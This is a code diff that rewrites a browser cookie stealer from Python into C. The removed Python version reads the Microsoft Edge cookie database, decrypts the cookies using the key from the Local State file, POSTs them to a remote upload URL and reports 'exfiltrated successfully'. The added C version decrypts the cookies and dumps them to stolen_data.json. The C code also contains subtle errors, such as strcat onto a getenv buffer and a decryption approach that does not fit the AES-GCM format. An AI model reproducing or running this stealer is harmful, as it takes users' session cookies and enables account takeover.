@@ -1,84 +1,72 @@
-import os
-import sqlite3
-import json
-import base64
-import shutil
-import requests
-from Crypto.Cipher import AES
-import win32crypt
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <windows.h>
+#include <wincrypt.h>
+#include <sqlite3.h>
 
-# Function to get Edge cookies
-def get_edge_cookies():
-    path = os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
-    temp_path = os.path.expanduser('~') + r"\AppData\Local\Temp\Cookies"
-    shutil.copyfile(path, temp_path)
-    
-    conn = sqlite3.connect(temp_path)
-    cursor = conn.cursor()
-    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
-    
-    cookies = []
-    for host_key, name, encrypted_value in cursor.fetchall():
-        decrypted_value = decrypt_edge_data(encrypted_value)
-        cookies.append({
-            "host": host_key,
-            "name": name,
-            "value": decrypted_value
-        })
-    
-    conn.close()
-    os.remove(temp_path)
-    return cookies
+#pragma comment(lib, "crypt32.lib")
 
-# Function to decrypt Edge data
-def decrypt_edge_data(encrypted_value):
-    try:
-        key = get_encryption_key()
-        iv = encrypted_value[3:15]
-        encrypted_value = encrypted_value[15:]
-        
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        decrypted_value = cipher.decrypt(encrypted_value)[:-16].decode()
-        return decrypted_value
-    except Exception as e:
-        return ""
+// Function to decrypt Edge data
+char* decrypt_edge_data(const unsigned char* encrypted_value, int encrypted_len) {
+    DATA_BLOB DataIn;
+    DATA_BLOB DataOut;
+    char* decrypted_value = NULL;
 
-# Function to get the encryption key
-def get_encryption_key():
-    local_state_path = os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data\Local State"
-    with open(local_state_path, "r", encoding="utf-8") as file:
-        local_state = json.loads(file.read())
-    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    encrypted_key = encrypted_key[5:]
-    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    DataIn.pbData = (BYTE*)encrypted_value;
+    DataIn.cbData = encrypted_len;
 
-# Function to send data to a remote server
-def send_data(data):
-    url = "http://192.168.0.1/upload"  # Unrouteable IP address
-    headers = {'Content-Type': 'application/json'}
-    try:
-        response = requests.post(url, data=json.dumps(data), headers=headers)
-        return response.status_code
-    except requests.exceptions.RequestException as e:
-        print(f"Failed to send data: {e}")
-        return None
+    if (CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
+        decrypted_value = (char*)malloc(DataOut.cbData + 1);
+        memcpy(decrypted_value, DataOut.pbData, DataOut.cbData);
+        decrypted_value[DataOut.cbData] = '\0';
+        LocalFree(DataOut.pbData);
+    }
 
-# Function to save data locally
-def save_data_locally(data):
-    script_dir = os.path.dirname(os.path.abspath(__file__))
-    output_path = os.path.join(script_dir, "stolen_data.json")
-    with open(output_path, 'w', encoding='utf-8') as file:
-        json.dump(data, file, ensure_ascii=False, indent=4)
-    print(f"Data saved locally at {output_path}")
+    return decrypted_value;
+}
 
-# Main function
-if __name__ == "__main__":
-    cookies = get_edge_cookies()
-    status_code = send_data(cookies)
-    if status_code == 200:
-        print("Data exfiltrated successfully.")
-    else:
-        print("Failed to exfiltrate data.")
-    
-    # Save data locally regardless of the exfiltration result
-    save_data_locally(cookies)
+// Function to get Edge cookies
+void get_edge_cookies() {
+    sqlite3* db;
+    sqlite3_stmt* stmt;
+    const char* db_path = getenv("LOCALAPPDATA");
+    strcat(db_path, "\\Microsoft\\Edge\\User Data\\Default\\Cookies");
+    const char* sql = "SELECT host_key, name, encrypted_value FROM cookies";
+
+    if (sqlite3_open(db_path, &db) == SQLITE_OK) {
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
+            FILE* file = fopen("stolen_data.json", "w");
+            if (file) {
+                fprintf(file, "[\n");
+                int first = 1;
+                while (sqlite3_step(stmt) == SQLITE_ROW) {
+                    const char* host_key = (const char*)sqlite3_column_text(stmt, 0);
+                    const char* name = (const char*)sqlite3_column_text(stmt, 1);
+                    const unsigned char* encrypted_value = (const unsigned char*)sqlite3_column_blob(stmt, 2);
+                    int encrypted_len = sqlite3_column_bytes(stmt, 2);
+
+                    char* decrypted_value = decrypt_edge_data(encrypted_value, encrypted_len);
+                    if (decrypted_value) {
+                        if (!first) {
+                            fprintf(file, ",\n");
+                        }
+                        first = 0;
+                        fprintf(file, "  {\n    \"host\": \"%s\",\n    \"name\": \"%s\",\n    \"value\": \"%s\"\n  }", host_key, name, decrypted_value);
+                        free(decrypted_value);
+                    }
+                }
+                fprintf(file, "\n]\n");
+                fclose(file);
+                printf("Data saved locally at stolen_data.json\n");
+            }
+            sqlite3_finalize(stmt);
+        }
+        sqlite3_close(db);
+    }
+}
+
+int main() {
+    get_edge_cookies();
+    return 0;
+}
